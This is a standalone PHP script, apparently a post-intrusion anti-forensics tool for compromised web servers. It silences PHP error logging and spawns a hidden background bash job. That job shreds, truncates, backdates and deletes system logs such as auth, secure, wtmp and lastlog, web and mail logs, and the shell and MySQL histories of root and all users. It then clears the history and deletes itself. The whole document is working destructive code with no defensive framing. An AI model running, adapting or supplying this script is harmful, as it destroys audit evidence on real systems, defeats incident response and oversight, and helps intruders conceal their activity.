<?php
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);
@error_reporting(0);

$self = __FILE__;
$hist = getenv('HISTFILE') ?: '/root/.bash_history';
$mysql = getenv('HOME') . '/.mysql_history';

$logs = [
    "/var/log/yum.log", "/var/log/wtmp", "/var/log/utmp", "/var/log/secure",
    "/var/log/mysqld.log", "/var/log/boot.log", "/var/log/httpd/*",
    "/var/log/maillog", "/var/log/cron", "/var/log/kern.log",
    "/var/log/auth.log", "/var/log/messages", "/var/log/lastlog",
    "/var/log/nginx/*", "/var/log/syslog", "/var/log/apache2/*",
    "/home/*/.bash_history", "/home/*/.mysql_history",
    "/root/.bash_history", "/root/.mysql_history", "$hist", "$mysql"
];

function rS($cmd) {
    $ds = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
    $px = proc_open($cmd, $ds, $pp);
    if (is_resource($px)) {
        foreach ($pp as $p) fclose($p);
        proc_close($px);
    }
}

$targets = implode(' ', array_map('escapeshellarg', $logs));
$wipe = "nohup bash -c '
for l in $targets; do
    for f in \$l; do
        if [ -f \"\$f\" ]; then
            shred -u -z -n 3 \"\$f\" 2>/dev/null || truncate -s 0 \"\$f\"
            touch -t 202201010101 \"\$f\" 2>/dev/null
            rm -f \"\$f\" 2>/dev/null
        fi
    done
done
history -c && history -w
' > /dev/null 2>&1 &";

rS($wipe);

if (file_exists($self)) {
    @unlink($self);
}

echo "Done.";
?>
